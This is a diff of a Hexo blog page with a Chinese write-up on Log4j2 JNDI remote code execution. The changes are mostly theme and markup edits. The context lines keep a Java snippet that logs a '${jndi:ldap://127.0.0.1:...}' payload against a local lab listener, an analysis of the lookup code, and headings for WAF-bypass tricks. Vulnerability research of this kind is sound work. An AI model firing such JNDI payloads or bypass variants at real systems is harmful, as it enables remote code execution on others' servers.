@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>Log4j2远程代码执行 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/07/22/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+<link rel="canonical" href="https://curlysean.github.io/2025/07/22/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-07-22T07:26:40.000Z">2025.07.22</time></div>
-      <div><span>更新</span><time datetime="2025-07-22T07:26:40.000Z">2025.07.22</time></div>
-      <div><span>阅读</span><strong>13 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#YQB3h"><span class="toc-text">Log4j2远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#jHGvr"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XbiWP"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yherI"><span class="toc-text">漏洞详情</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VGmps"><span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qxWBq"><span class="toc-text">探测payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IQNs8"><span class="toc-text">影响版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OoDt0"><span class="toc-text">漏洞复现与分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MwR8s"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#q6JLO"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oD63Q"><span class="toc-text">WAF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FF2Yn"><span class="toc-text">解析特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gm7yh"><span class="toc-text">绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GskGp"><span class="toc-text">利用${}默认值绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#VNags"><span class="toc-text">通过lower和upper绕过 </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UAwlg"><span class="toc-text">编码绕过</span></a></li></ol></li></ol></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#jHGvr"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XbiWP"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yherI"><span class="toc-text">漏洞详情</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VGmps"><span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qxWBq"><span class="toc-text">探测payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IQNs8"><span class="toc-text">影响版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OoDt0"><span class="toc-text">漏洞复现与分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MwR8s"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#q6JLO"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oD63Q"><span class="toc-text">WAF绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FF2Yn"><span class="toc-text">解析特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gm7yh"><span class="toc-text">绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GskGp"><span class="toc-text">利用${}默认值绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#VNags"><span class="toc-text">通过lower和upper绕过 </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UAwlg"><span class="toc-text">编码绕过</span></a></li></ol></li></ol></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-07-22T07:26:40.000Z">2025.07.22</time></div>
+        <div><span>更新</span><time datetime="2025-07-22T07:26:40.000Z">2025.07.22</time></div>
+        <div><span>阅读</span><strong>约 5 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="YQB3h">Log4j2远程代码执行</h1>
+        
 <h2 id="jHGvr">前言</h2>
 
 <p>Log4j感觉还是比较好利用的，在shagou大佬的面试中，给出一个log4j漏洞绕过payload，要求分析研判，虽说能一眼看出时log4j的利用，但是也是头一次见了。</p>
@@ -141,12 +162,12 @@
 <h3 id="MwR8s">漏洞复现</h3>
 
 <p>首先使用yakit工具（可以自己起RMI服务，我这里直接使用工具）生成一个jndi反连地址</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737530165136-526319c2-8a60-4bfa-b0ef-961f46983b3a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737530165136-526319c2-8a60-4bfa-b0ef-961f46983b3a.png" alt="Log4j2远程代码执行" loading="lazy"></p>
 <p>执行以下代码，生成该类的logger类，调用logger的error方法，payload放入，即可实现JNDI</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4jTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LogManager.getLogger(log4jTest.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:8085/RQqSMKMk&#125;&quot;</span>;</span><br><span class="line">        LOGGER.error(<span class="string">&quot;&#123;&#125;&quot;</span>,s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>成功弹出计算器</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737530486683-e57c8f18-5407-4bf5-bfdf-0656f92adb61.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737530486683-e57c8f18-5407-4bf5-bfdf-0656f92adb61.png" alt="Log4j2远程代码执行" loading="lazy"></p>
 <h3 id="q6JLO">漏洞分析</h3>
 
 <p> 我们看<code>logger.error()</code>（这里error可以换成其他方法，例如info）方法，会调用到<code>loggerConfig#processLogEvent</code></p>
@@ -159,7 +180,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf,</span></span><br><span class="line"><span class="params">                                    <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> getVariableResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>该<code>resolver</code>会根据前缀的不同，调用不同类的lookup方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737555096226-e9e83243-0d2a-47d6-9536-9ebc488bda95.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737555096226-e9e83243-0d2a-47d6-9536-9ebc488bda95.png" alt="Log4j2远程代码执行" loading="lazy"></p>
 <p>当jndi为前缀时，会调用<code>Interpolator#lookup</code>，其中<code>value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);</code>这行代码会调用JndiLookup的lookup方法，从而造成JNDI注入</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">        <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> strLookupMap.get(prefix);</span><br><span class="line">            <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">                ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">                value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> event == <span class="literal">null</span> ? defaultLookup.lookup(<span class="keyword">var</span>) : defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
@@ -172,7 +193,7 @@
 <ul>
 <li>如果在参数未定义的情况下,<code>:-</code>后面的值就是默认值</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753153880664-30ce67c4-7f03-43b7-9011-37f68ab71295.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753153880664-30ce67c4-7f03-43b7-9011-37f68ab71295.png" alt="Log4j2远程代码执行" loading="lazy"></p>
 <ul>
 <li>引用环境变量，例如<code>$&#123;env:PATH&#125;</code></li>
 <li>通过<code>upper</code>和<code>lower</code>进行大小写变换</li>
@@ -215,13 +236,13 @@
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/07/23/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>XStream反序列化</strong>
       </a>
     
     
-      <a href="/2025/07/22/CVE-2025-24813RCE%E5%A4%8D%E7%8E%B0/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/07/22/CVE-2025-24813RCE%E5%A4%8D%E7%8E%B0/">
+        <span>更早一篇</span>
         <strong>CVE-2025-24813</strong>
       </a>
     
@@ -235,9 +256,9 @@
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
